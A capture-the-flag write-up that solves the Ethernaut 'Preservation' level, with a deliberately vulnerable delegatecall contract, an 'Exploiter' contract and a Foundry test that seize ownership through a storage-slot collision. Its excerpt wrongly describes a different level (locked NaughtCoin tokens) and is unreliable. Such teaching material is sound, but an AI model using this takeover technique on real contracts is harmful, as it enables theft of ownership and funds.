---
title: 'Ethernaut Challenge #16 Solution — Preservation'
excerpt: This is Part 16 of the "Let’s play OpenZeppelin Ethernaut CTF" series, where I will explain how to solve each challenge.</br></br>We have tons of `NaughtCoin` tokens in our balance but we cannot withdraw them for **10 years**. The goal of this challenge is to find a way to withdraw them skipping the lock period.
coverImage:
  url: '/assets/blog/ethernaut/preservation.svg'
  credit:
    name: OpenZeppelin
    url: https://ethernaut.openzeppelin.com/
date: '2022-08-02T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernaut/preservation.svg'
---

This is Part 16 of the ["Let’s play OpenZeppelin Ethernaut CTF"](https://stermi.xyz/blog/lets-play-openzeppelin-ethernaut) series, where I will explain how to solve each challenge.

> [The Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity based wargame created by [OpenZeppelin](https://openzeppelin.com/).
> Each level is a smart contract that needs to be 'hacked'. The game acts both as a tool for those interested in learning ethereum, and as a way to catalogue historical hacks in levels. Levels can be infinite and the game does not require to be played in any particular order.

## Challenge #16: Preservation

> This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.
>
> The goal of this level is for you to claim ownership of the instance you are given.
>
> Things that might help
>
> - Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
> - Understanding what it means for `delegatecall` to be context-preserving.
> - Understanding how storage variables are stored and accessed.
> - Understanding how casting works between different data types.
>
> Level author(s): [Adrian Manning](https://github.com/AgeManning)

The goal of this challenge is to gain ownership of the level itself.

## Study the contracts

The contract itself is small, but the complexity of the challenge is pretty high, but fun!

Here's the code for `LibraryContract.sol`

```solidity
// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

It has a `uint256 storedTime` state variable and a setter function `setTime` that update the state variable with the input from the user. Pretty simple and straightforward.

This instead is the code of the `Preservation` main contract (the level):

```solidity
contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}
```

Let's review each part and understand how we could gain the ownership of it.

It has five different state variables

- `address public timeZone1Library` address of the first timezone library
- `address public timeZone2Library` address of the second timezone library
- `address public owner` address of the owner
- `uint256 storedTime` the time stored by one of the two timezone library
- `bytes4 constant setTimeSignature` the signature of the `setTime` function in the timezone library. This is not really a state variable because of the `constant` keyword

The `constructor` of the contract take two `address` type input to set the two library addresses and set the owner as `msg.sender`.

Then we have two different functions

- `function setFirstTime(uint256 _timeStamp) public`
- `function setSecondTime(uint256 _timeStamp) public`

They are identical, they just execute the same code on the two different timezone libraries. Let's see the code inside of one of them:

```solidity
function setFirstTime(uint256 _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
}
```

The function will call one of the library via `delegatecall` calling the `setTime` function and passing the `_timeStamp` as `calldata` parameter.

Let's have a recap of how `delegatecall` works. [`delegatecall`](https://www.evm.codes/#f4) is a **special** opcode from EVM that behaves as the [Solidity Docs](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries) explain:

> The code at the target address is executed in the context (i.e. at the address) of the calling contract and `msg.sender` and `msg.value` do not change their values.
> This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.

Have you spotted the problem?

Let's use our contracts as an example. When the `Preservation` contract execute `setFirstTime(100)` it will call `LibraryContract.setTime(100)` via `delegatecall`.

The code that is executed is from the `LibraryContract` contract, but the **context** that is used is the one that has executed the `delegatecall` opcode. When we talk about context, we are referring to the **storage**, the **current sender** (`msg.sender`) and the **current value** (`msg.value`).

**If `LibraryContract` modify the state, it will not modify its own state but the caller (`Preservation`) one!** This mean that when `LibraryContract.setTime` update the `storedTime` state variable is not updating the variable from its own contract but the one in **slot0** of the caller contract that is the `timeZone1Library` address.

The same thing happens when the `setSecondTime` function is executed, it will update the variable in **slot0** of the `Preservation` contract.

How can we exploit this bug? Is there a way to make the `delegatecall` modify the third storage slot that is storing the information about the `owner` state variable?

Well, not directly from `setFirstTime` or `setSecondTime` that will modify the value of the **slot0** variable. But what if we replace the **slot0** address with an address of a contract that we have deployed and that will mimic the same `Preservation` layout storage and will indeed update the **slot3** variable?

That's it! Let's make it happen!

## Solution code

First, we need to create a contract that

- Implement the same function implemented by the `LibraryContract` otherwise the transaction will revert
- Have three state variables that will mimic the `Preservation` layout storage to be able to update the `owner` variable
- update the `owner` variable in the `setTime` function

Let's see the code

```solidity
contract Exploiter {
    // mimim the `Preservation` contract layout structure
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    // Implement the same `setTime` function signature of `LibraryContract`
    function setTime(uint256 time) public {
        // Convert the `time` input to an `address` and update the `owner` state variable
        owner = address(time);
    }
}
```

And now we just need to execute it in our test file

```solidity
function exploitLevel() internal override {
    vm.startPrank(player, player);

    // Create and deploy out Exploiter contract
    Exploiter exploiter = new Exploiter();

    // Update the `Preservation` `timeZone1Library` address with our own `exploiter` address
    // by taking advantage of the `delegatecall` bug introduced in the contract
    level.setFirstTime(uint256(address(exploiter)));

    // Now when the level execute `setFirstTime` it will instead execute `exploiter.setTime` via delegatecall
    // We pass our own EOA address casted as a `uint256`. It will be casted back to `address` in the `setTime` function
    level.setFirstTime(uint256(player));

    vm.stopPrank();

    // Assert that we are now the new owner of the level
    assertEq(level.owner(), player);
}
```

You can read the full solution of the challenge, opening [Preservation.t.sol](https://github.com/StErMi/foundry-ethernaut/blob/main/test/Preservation.t.sol)

## Further reading

- [Solidity Docs: Delegatecall / Callcode and Libraries](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)
- [SWC-112: Delegatecall to Untrusted Callee](https://swcregistry.io/docs/SWC-112)
- [How to Secure Your Smart Contracts: 6 Solidity Vulnerabilities and how to avoid them: Delegatecall](https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17d)
- [Sigma Prime Solidity Security: Delegatecall](https://blog.sigmaprime.io/solidity-security.html#delegatecall)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
